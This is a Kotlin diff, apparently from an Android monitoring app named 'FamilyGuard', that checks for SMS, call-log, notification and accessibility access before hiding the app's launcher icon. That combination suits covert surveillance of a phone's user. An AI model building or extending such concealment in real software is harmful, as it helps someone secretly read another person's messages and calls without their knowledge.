@@ -238,14 +238,38 @@ private fun showLauncherIcon() {
 }
 
     private fun hideLauncherIcon() {
-        val componentName = ComponentName(this, MainActivity::class.java)
-        packageManager.setComponentEnabledSetting(
-            componentName,
-            PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
-            PackageManager.DONT_KILL_APP
-        )
-        setStatus("✅ Ilova ikonkasi yashirildi")
+    // Barcha kerakli ruxsatlarni tekshir
+    val missing = mutableListOf<String>()
+    
+    if (!FamilyGuardAccessibilityService.isEnabled()) 
+        missing.add("Accessibility")
+    if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_CALL_LOG) 
+        != PackageManager.PERMISSION_GRANTED) 
+        missing.add("Qo'ng'iroqlar")
+    if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_SMS) 
+        != PackageManager.PERMISSION_GRANTED) 
+        missing.add("SMS")
+    if (!isNotificationServiceEnabled()) 
+        missing.add("Bildirishnomalar")
+
+    if (missing.isNotEmpty()) {
+        AlertDialog.Builder(this)
+            .setTitle("⚠️ Ruxsatlar yetishmayapti")
+            .setMessage("Quyidagi ruxsatlar berilmagan:\n${missing.joinToString("\n• ", "• ")}\n\nYashirishdan oldin barcha ruxsatlarni bering!")
+            .setPositiveButton("OK") { d, _ -> d.dismiss() }
+            .show()
+        return
     }
+
+    // Hammasi yaxshi — yashiramiz
+    val componentName = ComponentName(this, MainActivity::class.java)
+    packageManager.setComponentEnabledSetting(
+        componentName,
+        PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
+        PackageManager.DONT_KILL_APP
+    )
+    setStatus("✅ Ilova ikonkasi yashirildi")
+}
 
     private fun setStatus(msg: String) {
         if (::tvStatus.isInitialized) tvStatus.text = msg
